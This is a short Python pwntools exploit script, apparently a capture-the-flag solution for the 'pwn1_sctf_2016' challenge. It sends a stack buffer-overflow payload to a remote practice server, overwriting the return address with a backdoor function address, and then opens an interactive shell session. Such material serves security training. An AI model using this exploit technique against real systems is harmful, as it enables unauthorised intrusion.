from pwn import *

context.log_level = 'debug'
backdoor = 0x08048F0D
io = remote('node3.buuoj.cn', 27858)
# io = process('pwn1_sctf_2016')

payload = b'I' * 21 + b'a' + p32(backdoor)
io.sendline(payload)
io.interactive()
